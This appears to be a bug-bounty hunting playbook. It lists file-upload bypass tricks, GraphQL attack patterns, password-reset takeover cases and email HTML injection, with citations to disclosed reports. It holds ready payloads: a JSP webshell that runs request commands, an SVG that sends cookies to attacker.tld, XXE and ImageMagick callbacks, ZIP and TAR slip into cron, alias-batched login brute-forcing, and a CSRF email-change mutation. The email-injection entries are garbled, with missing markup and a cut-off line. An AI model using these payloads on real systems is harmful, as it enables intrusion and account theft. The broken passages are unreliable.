cited_examples.pattern_shape: Apache Tomcat with HTTP PUT enabled (`readonly=false` in DefaultServlet config) accepted file uploads via PUT. The validator rejected `.jsp` extensions but the attacker bypassed by appending `/` to the filename: `PUT /shell.jsp/ HTTP/1.1`. Tomcat's filesystem layer stripped the trailing slash and stored `shell.jsp`, which was then executable.
cited_examples.key_trick: The bypass exploited a normalization mismatch between the validation layer (which sees `shell.jsp/`) and the storage layer (which sees `shell.jsp`). The same shape — validator and storer disagree on the canonical filename — recurs in many CVE entries against different products.
cited_examples.why_it_matters: Tomcat is ubiquitous. The CVE provides a verifiable cite for any operator finding PUT enabled. Internal-tooling Tomcat instances frequently still ship `readonly=false`.

patterns.name: Case-sensitivity bypass on extension allowlist
patterns.when_to_suspect: Server validates extension against a case-sensitive blocklist (`if ext == ".php": reject`).
patterns.test: Upload `shell.PHP`, `shell.Php`, `shell.pHp`. Linux filesystems are case-sensitive but PHP-FPM / mod_php often dispatch case-insensitively.
patterns.validation: Fetch the uploaded file. If the response shows PHP execution output (not raw source), bypass succeeded.
patterns.pay_grade_rationale: Critical when execution achieved on a public-facing server.

patterns.name: Double-extension trick
patterns.when_to_suspect: Server validates only the *last* extension or only the *first* extension.
patterns.test: Upload `shell.php.jpg` (last-only validator: sees `.jpg`, accepts; Apache mod_php with `AddHandler` based on inner extension may execute). Or `shell.jpg.php` (first-only validator: sees `.jpg`, accepts; server executes as PHP).
patterns.validation: Fetch the uploaded file. If PHP executes, bypass confirmed.
patterns.pay_grade_rationale: Critical.

patterns.name: Alternative PHP extensions
patterns.when_to_suspect: Blocklist drops `.php` only.
patterns.test: Try `.phar`, `.pht`, `.phtml`, `.php5`, `.php7`, `.phps`, `.phtm`, `.inc`. Most PHP installations execute all of these by default.
patterns.validation: Fetch and observe execution.
patterns.pay_grade_rationale: Critical.

patterns.name: Null-byte truncation (legacy PHP < 5.3)
patterns.when_to_suspect: Target runs ancient PHP. Validator concatenates extension to filename without sanitization.
patterns.test: Upload `shell.php%00.jpg`. Older PHP truncated at null byte, saving as `shell.php`; validator saw `.jpg` and accepted.
patterns.validation: Fetch `shell.php` — execution.
patterns.pay_grade_rationale: Critical, but only on legacy targets.

patterns.name: Content-Type header spoofing
patterns.when_to_suspect: Server validates uploaded MIME by checking the request's `Content-Type` header rather than the file's magic bytes.
patterns.test: Upload PHP source with `Content-Type: image/jpeg` in the multipart part.
patterns.validation: Fetch — execution.
patterns.pay_grade_rationale: Critical.

patterns.name: Magic-byte polyglot (image + PHP)
patterns.when_to_suspect: Validator checks magic bytes but ignores trailing content.
patterns.test: Prepend valid JPEG header (`FF D8 FF E0 ...`) or GIF header (`GIF89a`) to the PHP source. Save as `shell.php` (or with any of the alternative PHP extensions).
patterns.validation: Fetch — PHP executes despite valid image header. ImageMagick / GD-based validators are still bypassed because the file genuinely contains a valid image segment plus PHP source.
patterns.pay_grade_rationale: Critical.

patterns.name: SVG with embedded JavaScript (stored XSS)
patterns.when_to_suspect: Avatar / profile-image upload accepts SVG and serves with `Content-Type: image/svg+xml`.
patterns.test:
Upload:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//attacker.tld/x?'+document.cookie)">
    <script>alert(document.domain)</script>
  </svg>
  ```
  Visit the served URL as a top-level navigation (`https://target/uploads/avatar.svg`).
patterns.validation: OOB callback fires with cookies from a victim test account, or `alert` fires when the file is loaded.
patterns.pay_grade_rationale: High to critical depending on chain.

patterns.name: HTML with `.pdf` or `.txt` extension served as `text/html`
patterns.when_to_suspect: Server determines Content-Type from extension lookup table but the table has gaps. Or the server respects an `X-Content-Type-Options: nosniff` absence and MIME-sniffs to HTML.
patterns.test: Upload `shell.pdf` containing `<html><script>alert(1)</script></html>`.
patterns.validation: Browser MIME-sniffs and renders as HTML, script executes.
patterns.pay_grade_rationale: High when chained to ATO (stored XSS in admin context).

patterns.name: ZIP slip — path traversal via archive filename
patterns.when_to_suspect: Application accepts ZIP/TAR archives and extracts them server-side (plugin install, theme upload, bulk import, backup restore).
patterns.test: Craft a ZIP containing a file named `../../../../var/www/html/shell.php` (or similar absolute/relative path). Use `zip --symlinks` or low-level zip libraries to bypass tools that sanitize.
patterns.validation: After upload, check the target path for the extracted file. Fetch via web to confirm execution.
patterns.pay_grade_rationale: Critical.

patterns.name: TAR slip / symlink-in-archive
patterns.when_to_suspect: Application uses `tar -xf` without `--no-overwrite-dir` or similar safeguards.
patterns.test: Create a TAR containing a symlink (`link -> /etc/cron.d/`) and a regular file named `link/x`. Extraction follows the symlink, writing `x` into `/etc/cron.d/x` outside the intended directory.
patterns.validation: File appears in target directory; cron picks it up.
patterns.pay_grade_rationale: Critical.

patterns.name: `.htaccess` upload enabling PHP in image directory
patterns.when_to_suspect: Apache + PHP. Upload feature accepts arbitrary filenames. Upload directory is at `AllowOverride All`.
patterns.test:
Upload `.htaccess` with:
  ```
  AddType application/x-httpd-php .png
  ```
  Then upload `shell.png` containing PHP source. Fetch `shell.png` — mod_php executes.
patterns.validation: PHP output in response.
patterns.pay_grade_rationale: Critical.

patterns.name: `web.config` upload on IIS
patterns.when_to_suspect: IIS server. Upload directory accepts `web.config`.
patterns.test: Upload `web.config` declaring a custom handler for `.png`. Fetch a previously-uploaded `.png` containing payload — handler executes it.
patterns.validation: Payload runs in IIS application pool context.
patterns.pay_grade_rationale: Critical.

patterns.name: JSP / WAR upload for Tomcat
patterns.when_to_suspect: Java application server (Tomcat, Jetty, JBoss) with file upload reaching a directory served as a webapp.
patterns.test:
Upload `shell.jsp`: ```jsp <%@ page import="java.util.*,java.io.*"%> <% Process p = Runtime.getRuntime().exec(request.getParameter("c")); %> 
<% BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null) out.println(l); %>
``` For `.war` upload to the Tomcat manager (CVE-2017-12615 style), PUT the WAR to a path.
patterns.validation: Fetch `shell.jsp?c=id` — command output in response.
patterns.pay_grade_rationale: Critical.

patterns.name: `.aspx` upload for IIS
patterns.when_to_suspect: IIS + ASP.NET. Upload accepts `.aspx`.
patterns.test: Upload an ASPX webshell. Fetch and observe execution.
patterns.validation: Webshell command output.
patterns.pay_grade_rationale: Critical.

patterns.name: XXE via DOCX / XLSX / SVG upload
patterns.when_to_suspect: Application processes uploaded Office documents (DOCX, XLSX), SVG, or other XML-based formats with a backend XML parser.
patterns.test:
Inject XXE into the XML content:
  ```xml
  <!DOCTYPE r [<!ENTITY xxe SYSTEM "http://attacker.tld/x">]>
  <root>&xxe;</root>
  ```
  Embed in `word/document.xml` inside a DOCX, or directly in an SVG file.
patterns.validation: OOB callback from the parsing server; or local-file disclosure via `file:///etc/passwd` entity if response reflects content.
patterns.pay_grade_rationale: High to critical depending on what files are reachable.

patterns.name: Polyglot GIF+JS for client-side XSS chain
patterns.when_to_suspect: Application serves uploaded files with permissive Content-Type and an XSS sink loads them as `<script src=...>`.
patterns.test: Create a file beginning with `GIF89a/*` (valid GIF header that is also a valid JS comment opener), then JS code `*/=1;alert(document.domain);`. Save as `x.gif`.
patterns.validation: Image displays as GIF (or fails benignly), but when loaded as `<script src="x.gif">` the JS executes.
patterns.pay_grade_rationale: High when reachable in a script-include chain.

patterns.name: ImageMagick MVG polyglot (ImageTragick class)
patterns.when_to_suspect: Server processes images with ImageMagick. Validators accept by magic bytes.
patterns.test:
Upload an MVG file disguised as JPEG:
  ```
  push graphic-context
  viewbox 0 0 640 480
  fill 'url(https://attacker.tld/x)'
  pop graphic-context
  ```
  Or use the classic command injection payload (varies by ImageMagick version and policy.xml).
patterns.validation: OOB callback from the target server during image processing.
patterns.pay_grade_rationale: Critical.

patterns.name: Symlink upload pointing to internal file
patterns.when_to_suspect: Server accepts uploads that include symbolic links and the upload directory is served back as static content.
patterns.test: Create a symlink (`ln -s /etc/passwd link.txt`) and upload it via a multipart form. If preserved, fetching `link.txt` returns the contents of `/etc/passwd`.
patterns.validation: Response body is the linked target file.
patterns.pay_grade_rationale: High depending on disclosed content.

cited_examples.name: Reset token leaked / not bound / non-expiring
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/173551>, <https://hackerone.com/reports/685007>).
cited_examples.pattern_shape: The reset token is exposed to the attacker (Referer leak, response body, host-header poisoning) or stays valid after the email changes / after use — so a captured or stale token still resets the account.
cited_examples.key_trick: Request a reset, then (a) check whether the token appears in any cross-origin request/Referer, (b) change the account email and retry the old token, (c) reuse the token twice. Any success = ATO. Test host-header injection on the reset link generator.
cited_examples.why_it_matters: Direct account takeover, routinely Critical with four-to-five-figure bounties. The token is the whole authentication in that moment.

cited_examples.name: No rate limit on recovery / OTP → brute or enumeration
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/723974>, <https://hackerone.com/reports/1987062>, <https://hackerone.com/reports/2501984>).
cited_examples.pattern_shape: The reset request, OTP verification, or recovery-answer endpoint has no throttle, letting an attacker brute the OTP, stuff recovery answers, or enumerate which emails have accounts.
cited_examples.key_trick: Fire the OTP/recovery endpoint with a fixed victim + varying code (or varying email) and confirm no lockout/backoff. Pair with `hunt-brute-force`. Statistical: sample 100+ attempts before claiming no limit (avoid the server-policy-vs-state trap).
cited_examples.why_it_matters: Turns a bounded secret (6-digit OTP, security answer) into a guessable one; enumeration feeds targeted ATO.

cited_examples.name: Further disclosed reports (this class)
PortSwigger Research — Daniel Thatcher, GraphQL attack methodology
cited_examples.source: PortSwigger Research, body of work by Daniel Thatcher and others on GraphQL security. Published at portswigger.net/research; the team also maintains the Web Security Academy GraphQL labs which codify the techniques.
cited_examples.pattern_shape: The methodology Thatcher documented for GraphQL hunting: discover the endpoint, attempt introspection, fall back to field-suggestion fuzzing when introspection is disabled, alias-batch to amplify rate-limited operations, and probe operation-confusion between queries and mutations to exploit auth checks that only run on the wrong operation type.
cited_examples.key_trick: Field-suggestion fuzzing — when introspection returns null/error, send queries with intentionally-misspelled field names and parse the server's "Did you mean...?" error responses. The server unintentionally leaks valid field names while *declining* to enumerate the schema. Tooling: `clairvoyance` automates this against a wordlist.
cited_examples.why_it_matters: Most production GraphQL endpoints disable introspection in production builds. Operators who stop at "introspection disabled, moving on" miss everything; operators who carry the field-suggestion + clairvoyance workflow find the schema anyway and proceed to the resolver-auth bugs that pay.

cited_examples.name: GitHub Security — GraphQL depth and node-ID design (developer-facing)
cited_examples.source: GitHub Security Lab and engineering blog posts documenting how GitHub structures GraphQL node IDs (`base64("TypeName:database_id")`) and how they impose query-depth limits to defend against recursive-query DoS. Search the GitHub blog by topic.
cited_examples.pattern_shape: Two adjacent lessons from a well-documented production GraphQL deployment. (1) Node IDs that encode `TypeName:ID` give operators a "global object handle" that they can manipulate to fetch objects of one type using an ID belonging to a different type — IDOR with type confusion. (2) Depth limits without complexity limits are bypassable via fragment-spread amplification — a query that's only 3 levels deep on paper can resolve thousands of nested objects via fragments.
cited_examples.key_trick: Decode every node ID you see (`echo "VXNlcjox" | base64 -d` → `User:1`). Look for `User:`, `Repository:`, `Organization:`, `PullRequest:` prefixes. Then try fetching with a wrong-type ID — `node(id: "User:other-user-id") { ... on User { email role } }` — and observe whether the resolver checks ownership before returning fields.
cited_examples.why_it_matters: Node-ID IDOR is the single most-paid GraphQL bug class. The pattern repeats on every Relay-style GraphQL API.

cited_examples.name: Apollo Server / Hasura introspection-default disclosures
cited_examples.source: Apollo Server, Hasura, and most off-the-shelf GraphQL frameworks default to *enabling* introspection unless explicitly turned off for production builds. This is documented in each framework's deployment guide and surfaces in disclosed bounty reports as "introspection enabled in production exposes the full schema."
cited_examples.pattern_shape: Standalone, schema disclosure is informational. *Chained*, it is the prerequisite that turns a hidden authorization bug into a reportable critical: introspection reveals an undocumented mutation (`grantAdminAccess`, `setUserRole`, `bypassPaymentCheck`), the operator discovers it has no authorization guard, the mutation is fired by a low-privilege user, the privilege escalates.
cited_examples.key_trick: Introspection alone is rejected as N/A by most programs. Always pair the introspection finding with a *consequence* — an undocumented mutation reachable from a low-privilege session — and report the consequence.
cited_examples.why_it_matters: Don't waste a report on bare introspection. The introspection is recon; the bug is the mutation it surfaced.

cited_examples.name: Persisted-query bypass — `extensions.persistedQuery` operation injection
cited_examples.source: Apollo Server documentation for Automatic Persisted Queries (APQ) and the corresponding security advisories for misconfigurations. The class is documented across Apollo's docs and disclosed reports against APQ-enabled deployments.
cited_examples.pattern_shape: When a GraphQL server enables APQ, the client sends `{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}` and the server resolves the hash to a server-stored query string. Misconfigurations include: (a) the server falls back to running the *ad-hoc* `query` field when the hash is unknown (the "PersistedQueryNotFound" fallback), defeating the entire allow-list; (b) the server accepts a falsy hash value and processes the ad-hoc query without comparison; (c) the hash is computed client-side and the server trusts the (hash, query) pair without verifying the hash matches the query content.
cited_examples.key_trick: When a production endpoint claims "persisted queries only" (rejecting ad-hoc queries), test the APQ-fallback by sending a fake hash and a malicious ad-hoc query in the same request. If the server runs the ad-hoc query and returns its result, the allow-list is theatrical.
cited_examples.why_it_matters: Operators who give up on a "persisted queries only" endpoint without testing the fallback miss a high-impact misconfig that effectively neutralizes the entire defense.

cited_examples.name: Field/query-level authz gap → cross-tenant / private-data disclosure
cited_examples.source: A GraphQL query disclosed sensitive private-program data ($25,000, <https://hackerone.com/reports/1618347>); queries exposed other customers' emails and confidential data (<https://hackerone.com/reports/807448>; <https://hackerone.com/reports/489146>).
cited_examples.pattern_shape: A GraphQL field/type is authorized at the query root but not per-field or per-object, so a caller selects fields (email, private metadata, cross-tenant objects) they shouldn't see. GraphQL's flexible selection makes the missing field-level check easy to reach.
cited_examples.key_trick: Introspect the schema, then request sensitive fields on shared types (`User`, `Program`, `Account`) from an unrelated context. Probe every field, not just what the UI selects — the leak is usually a field the UI never renders.
cited_examples.why_it_matters: Direct info-disclosure at scale; the dominant GraphQL bounty class.

cited_examples.name: GraphQL IDOR on operation arguments
cited_examples.source: IDOR on `BillingDocumentDownload` / `BillDetails` operations via the invoice ID (<https://hackerone.com/reports/2207248>, $5,000).
cited_examples.pattern_shape: A GraphQL query/mutation takes an object ID (invoice, document, node) and returns/acts on it without scoping to the viewer — the same IDOR as REST, but reachable through the typed operation and often missed because the REST endpoint *was* fixed.
cited_examples.key_trick: Enumerate operations taking an ID argument; swap IDs across tenants. Always test the Relay `node(id:)`/`nodes()` backdoor. Pairs with `hunt-idor`.
cited_examples.why_it_matters: GraphQL re-opens IDORs teams thought they'd closed at the REST layer.

cited_examples.name: Mutation aliasing / batching → DoS & rate-limit bypass
cited_examples.source: DoS via mutation aliasing in an account-recovery flow (<https://hackerone.com/reports/3287208>, $12,500).
cited_examples.pattern_shape: GraphQL lets one request contain many aliased copies of the same mutation/field. Without per-operation cost limits, this amplifies work (DoS) or bypasses per-request rate limits (e.g. brute-forcing OTP/recovery N times in one HTTP request).
cited_examples.key_trick: Send a single query with 100 aliased copies of a sensitive mutation (`a: mutation, b: mutation, ...`). If all execute, there's no query-cost/aliasing limit — report as DoS and/or rate-limit bypass.
cited_examples.why_it_matters: A GraphQL-specific amplification with no REST analog; feeds `hunt-brute-force`.

cited_examples.name: GraphQL argument → downstream injection (search/sort → engine)
cited_examples.source: A `sort_query` string argument passed to a downstream Elasticsearch cluster enabled Painless script execution (<https://hackerone.com/reports/3694007>, $7,000).
cited_examples.pattern_shape: A GraphQL string argument (sort, filter, search DSL) flows unsanitized into a downstream engine — Elasticsearch Painless, a SQL builder, a template — turning a query field into an injection/RCE sink.
cited_examples.key_trick: Trace every free-string GraphQL argument to its backend. For search/sort args, test engine-specific injection (Painless `{{...}}`, ES query DSL, SQL). Overlaps `hunt-rce`/`hunt-sqli` at the sink.
cited_examples.why_it_matters: Escalates GraphQL from data-layer to code execution.

patterns.name: Endpoint discovery — find the GraphQL
patterns.when_to_suspect: Burp passive scan shows POST with `application/json` body of shape `{"query": "..."}`. JS bundles reference Apollo, Relay, `graphql-tag`, `gql\``. Wayback or katana crawl turns up `/graphql`, `/api/graphql`, `/v1/graphql`, `/query`, `/gql`, `/graph`.
patterns.test:
GET / POST against the candidate path with the simplest valid query:
  ```
  POST /graphql HTTP/1.1
  Content-Type: application/json

  {"query":"{ __typename }"}
  ```
  Expected response: `{"data":{"__typename":"Query"}}` (or `QueryRoot`, depending on framework).
patterns.validation: The `__typename` introspection field returning *any* non-null value confirms GraphQL. Some frameworks (Hasura) name it `query_root`.
patterns.pay_grade_rationale: Discovery only — no bug yet. Used to scope subsequent testing.

patterns.name: Full introspection query (when enabled)
patterns.when_to_suspect: `{ __typename }` succeeded.
patterns.validation: Server returns a populated `types` array with mutation / query field names. Save to a file; grep for keywords (`admin`, `internal`, `bypass`, `grant`, `setRole`, `delete`, `secret`, `token`, `password`).
patterns.pay_grade_rationale: Recon. Standalone informational; report only when chained to a downstream bug surfaced from the disclosed schema.

patterns.name: Field-suggestion fuzzing (introspection disabled)
patterns.when_to_suspect: Introspection returns null, error, or an "Introspection is disabled" message.
patterns.test:
Send queries with deliberately-misspelled field names and parse "Did you mean...?" errors:
  ```
  {"query":"{ userrr { id } }"}
  ```
  Response: `{"errors":[{"message":"Cannot query field \"userrr\" on type \"Query\". Did you mean \"user\" or \"users\"?"}]}`
patterns.validation:
"Did you mean" responses are present. Tooling — `clairvoyance` (`pip install clairvoyance`) automates this against a wordlist:
  ```bash
  clairvoyance -o schema.json -w wordlist.txt https://target.com/graphql
  ```
patterns.pay_grade_rationale: Recon. Same as introspection — informational standalone; load-bearing for downstream findings.

patterns.name: Node-ID IDOR (Relay-style global object handle)
patterns.when_to_suspect: Schema uses Relay's `Node` interface with `node(id: ID!)` and base64-encoded IDs. Common in GitHub, Shopify, Facebook, and any Relay-based API.
patterns.validation: Response contains data belonging to a different account / different object type than the requesting session should have access to.
patterns.pay_grade_rationale: Critical when cross-tenant data leaks. High when same-tenant cross-object data leaks.

patterns.name: Alias batching for rate-limit bypass
patterns.when_to_suspect: Endpoint with rate-limiting per HTTP request (login, OTP, redeem code). The rate-limiter counts requests, not operations.
patterns.test:
Pack many operations into one query via aliases:
  ```graphql
  mutation {
    a1: login(username: "victim", password: "0000")
    a2: login(username: "victim", password: "0001")
    a3: login(username: "victim", password: "0002")
    a4: login(username: "victim", password: "0003")
    a5: login(username: "victim", password: "0004")
  }
  ```
  One HTTP request = one rate-limit hit, but five password attempts.
patterns.validation: All five resolvers fire (response contains five `a1`..`a5` keys with login results). Rate-limit headers (if present) increment by 1, not 5.
patterns.pay_grade_rationale: Critical when chained to brute-force (e.g. 6-digit OTP across 1000 aliases in one request = 1000 attempts at one rate-limit hit).

patterns.name: Alias batching for race-condition amplification (limited)
patterns.when_to_suspect: A resolver mutates state with a uniqueness or quota check (coupon redeem, balance debit, account-create). Cross-reference `hunt-race`.
patterns.test:
Send many aliases of the same mutation in one request:
  ```graphql
  mutation {
    r1: redeemCoupon(code: "WELCOME10")
    r2: redeemCoupon(code: "WELCOME10")
    r3: redeemCoupon(code: "WELCOME10")
    r4: redeemCoupon(code: "WELCOME10")
    r5: redeemCoupon(code: "WELCOME10")
  }
  ```
patterns.validation: Multiple aliases succeed against a uniqueness constraint that should reject after the first. *Important caveat from Phase 2E:* alias batching only races resolvers when the server processes aliases *concurrently* on a multi-threaded resolver. Most reference implementations (Apollo, GraphQL-Ruby, Graphene) resolve aliases *sequentially*. To force concurrency, use parallel HTTP via Burp Turbo Intruder single-packet attack with multiple TCP connections rather than alias batching alone.
patterns.pay_grade_rationale: Critical when the race wins (double-spend confirmed).

patterns.name: Node-IDOR via Base64 ID prediction
patterns.when_to_suspect: Node IDs follow predictable patterns — `base64("User:" + sequential_int)`. Decode three of your own IDs and the encoding scheme reveals itself.
patterns.test: Generate IDs for adjacent integers and query each. Or use `base64("User:1")`, `base64("User:2")`, etc. for low IDs (admin users often live at low integers).
patterns.validation: Sequential enumeration yields cross-account data.
patterns.pay_grade_rationale: Critical when admin-tier accounts are reachable.

patterns.name: GraphQL via GET (CSRF candidate)
patterns.when_to_suspect: Server accepts `GET /graphql?query=...` in addition to POST.
patterns.test:
```
  GET /graphql?query={user(id:1){email}} HTTP/1.1
  Cookie: session=victim_session
  ```
  Confirm via browser-clickable link served on attacker.com — if cookies attach and the GraphQL query fires with the victim's session, CSRF is viable.
patterns.validation: Cross-origin request with `Cookie` header attached executes the query.
patterns.pay_grade_rationale: Medium standalone (CSRF on a read). High when GET also accepts mutations (rare but seen — usually a misconfiguration). Verify the side effect happened, not just that the request returned 200.

patterns.name: Mutation-via-GET (server accepts mutation on GET request)
patterns.when_to_suspect: Server treats `mutation` body identically regardless of HTTP method.
patterns.test:
```
  GET /graphql?query=mutation{changeEmail(newEmail:"attacker@evil.com")} HTTP/1.1
  Cookie: session=victim_session
  ```
patterns.validation: Email actually changed (verify with a follow-up `GET /api/me` showing the new email). Without verification, the 200 means nothing.
patterns.pay_grade_rationale: Critical (CSRF to mutation with side effect).

patterns.name: Persisted-query fallback bypass (`extensions.persistedQuery`)
patterns.when_to_suspect: Production endpoint rejects ad-hoc queries with "PersistedQueryNotFound" or similar. Apollo Automatic Persisted Queries (APQ) is in play.
patterns.validation: The `query` field executes and returns data despite the server's claim of allow-list enforcement.
patterns.pay_grade_rationale: Critical. Neutralizes the allow-list defense.

patterns.name: Depth attack — recursive nesting DoS
patterns.when_to_suspect: Schema has reciprocal references — `User.friends.friends.friends...`, `Post.author.posts.author.posts...`.
patterns.validation: Server response time grows exponentially, or server returns 500 / connection-reset on sufficient depth. Statistical sampling against baseline (10 requests at depth-3, 10 at depth-8).
patterns.pay_grade_rationale: Medium standalone (DoS). High when the server crashes or load increases enough to affect other users — confirm with side-channel timing on a separate endpoint during the attack.

patterns.name: Alias-amplified DoS
patterns.when_to_suspect: Single expensive resolver (e.g. `expensiveReport`) without per-query cost limiting.
patterns.test:
1000 aliases of the same expensive query in one request — each alias triggers a full resolver invocation.
  ```graphql
  { r1: expensiveReport, r2: expensiveReport, r3: expensiveReport, ... }
  ```
patterns.validation: Response time scales linearly with alias count; server resource utilization spikes.
patterns.pay_grade_rationale: Medium to high depending on impact.

patterns.name: Batch query (top-level array body)
patterns.when_to_suspect: Apollo and some servers accept `[{ "query": "..." }, { "query": "..." }, ...]` as a top-level array body.
patterns.test:
```json
  [
    {"query":"{ user(id:1) { email } }"},
    {"query":"{ user(id:2) { email } }"},
    {"query":"{ user(id:3) { email } }"}
  ]
  ```
patterns.validation: Server returns an array of responses, one per batched query. Useful for enumeration with single rate-limit hit.
patterns.pay_grade_rationale: Critical when chained to enumeration that the rate-limiter was supposed to prevent.

patterns.name: Field-level authorization bypass (resolver-side miss)
patterns.when_to_suspect: A type has a `secret`, `password_hash`, `token`, `internal_notes`, `admin_metadata` field. The type-level resolver authorizes "can the user read this object?" but does not authorize each field independently.
patterns.test:
Query an object you do have access to, request a normally-hidden field:
  ```graphql
  { me { id email passwordHash recoveryCodes apiToken } }
  ```
patterns.validation: Sensitive field returned in response despite the API's documentation claiming the field is admin-only or internal.
patterns.pay_grade_rationale: Critical when password hashes or auth tokens leak.

patterns.name: Operation-type confusion (query vs mutation)
patterns.when_to_suspect: Server authorizes mutations strictly but treats `query` as anonymous-readable. A side-effecting resolver was registered as a query rather than a mutation.
patterns.test:
Look for any field whose name suggests an action (`createUser`, `sendEmail`, `resetPassword`, `transferFunds`) registered under `Query` instead of `Mutation`. Fire it as a query:
  ```graphql
  { resetPassword(email: "victim@target.com") { success } }
  ```
patterns.validation: Side effect happened (email sent, password reset, fund transferred) despite the auth middleware only guarding mutations.
patterns.pay_grade_rationale: Critical.

cited_examples.name: Injected markup in a confirmation / notification email
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>, <https://hackerone.com/reports/3079966>).
cited_examples.pattern_shape: A user-controlled field (name, comment, request subject) is reflected unescaped into a transactional email the app sends to another user or an admin. No script runs, but injected ``/``/dangling-markup exfiltrates via link clicks or leaks the recipient's context.
cited_examples.key_trick: Set your profile/first-name/comment to `click` or a dangling `
cited_examples.why_it_matters: Reaches an audience the web app can't (admins, other tenants) and lands even when the web UI is well-escaped. Frequently the only place HTML is rendered unfiltered.

cited_examples.name: Name / profile field HTML injection → content spoofing
cited_examples.source: Disclosed across multiple programs (<https://hackerone.com/reports/1343492>, <https://hackerone.com/reports/428019>).
cited_examples.pattern_shape: A displayed identity field (firstName, display name, org name) renders raw markup in another user's view. Injected markup spoofs UI, injects fake login prompts, or hides/overlays legitimate content.
cited_examples.key_trick: Inject markup into every field that renders in someone else's context; check both the web view and any generated PDF/email. Chain with CSRF when the field is set on the victim's behalf.
